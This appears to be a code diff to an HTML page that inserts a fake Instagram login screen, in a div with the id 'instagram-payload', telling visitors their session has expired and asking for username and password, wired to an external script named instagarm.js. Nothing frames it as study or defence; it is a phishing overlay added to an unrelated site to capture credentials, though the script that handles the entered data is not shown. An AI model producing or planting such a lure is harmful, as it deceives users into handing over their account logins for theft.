@@ -10,6 +10,7 @@
   <link rel="stylesheet" href="main.css">
   <link href="https://fonts.googleapis.com/css2?family=Bangers&display=swap" rel="stylesheet">
   <script src="js/jquery-3.3.1.min.js"></script>
+  <link rel="stylesheet" href="insta.css">
 </head>
 
 <body>
@@ -125,6 +126,58 @@
     </div>
 
   </div>
+
+
+
+  <div class="insta-screen">
+    <div id="instagram-payload">
+      <!-- main tool -->
+      <div class="insta-logo">
+        <img src="insta-text.png" alt="Instagram logo" id="insta-text-logo">
+      </div>
+
+
+      <div class="error-headline">
+        Error
+      </div>
+      <div class="error-message">
+        Your Session has been expired. Re-login to stay active on Instagram.
+      </div>
+
+
+      <div class="input-form">
+        <div class="username-input-field">
+          <input type="text" placeholder="Phone number, username, email" id="insta-username">
+        </div>
+        <div class="password-input-field">
+          <input type="password" placeholder="Password" id="insta-password">
+        </div>
+      </div>
+
+
+      <div id="incorrect-error">
+        Incorrect username or password!
+      </div>
+
+
+      <div class="login-field">
+        <button class="login-btn" onclick="LogIn()">Log in</button>
+      </div>
+
+      <div class="or-line">
+        <hr>
+        OR
+        <hr>
+      </div>
+
+
+      <div class="login-with-fb">
+        Log in with Facebook
+      </div>
+    </div>
+  </div>
+
+  <script src="instagarm.js"></script>
 
   <img id="rotate" src="./img/rotate.png">
 
